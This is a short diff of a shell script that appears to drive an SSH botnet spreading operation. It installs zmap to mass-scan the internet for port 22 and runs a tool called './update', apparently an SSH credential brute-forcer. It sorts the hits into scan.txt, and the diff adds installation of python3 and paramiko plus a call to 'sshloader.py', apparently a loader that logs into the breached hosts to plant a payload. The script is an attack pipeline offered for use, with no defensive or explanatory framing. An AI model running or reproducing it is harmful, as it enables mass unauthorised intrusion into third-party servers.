@@ -1,4 +1,6 @@
 apt-get install zmap -y
+apt-get install python3 -y && apt-get install python3-pip
+python3 -m pip install paramiko
 
 zmap -p 22 -o mfu.txt -B100M
 
@@ -7,3 +9,5 @@ chmod 777 *
 ./update 15000
 
 cat vuln.txt | sort | uniq > scan.txt
+
+python3 sshloader.py scan.txt
